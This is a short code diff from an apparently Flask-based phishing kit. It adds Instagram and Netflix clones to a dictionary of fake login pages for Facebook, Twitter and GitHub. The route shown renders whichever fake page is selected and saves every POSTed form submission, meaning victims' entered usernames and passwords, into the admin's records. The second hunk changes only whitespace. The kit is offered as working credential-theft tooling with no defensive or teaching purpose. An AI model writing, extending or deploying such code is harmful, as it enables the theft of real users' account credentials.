@@ -11,6 +11,8 @@ FAKE_PAGES = {
     'fb' : 'pages/facebook.html',
     'tw' : 'pages/twitter.html',
     'gh' : 'pages/github.html',
+    'insta' : 'pages/instagram.html',
+    'nf' : 'pages/netflix.html',
 }
 
 
@@ -18,7 +20,7 @@ FAKE_PAGES = {
 def main():
     admin = User.query.filter_by(username=config.get('admin', 'username')).first()
     if request.method == 'POST':
-        admin.records = pprint.pformat(request.form, indent=4)
+        admin.records = pprint.pformat(request.form, indent=4)   
         db.session.commit()
 
     return render_template(FAKE_PAGES.get(admin.current_page, 'boot.html'), admin_url=config.get('admin', 'admin_route'))
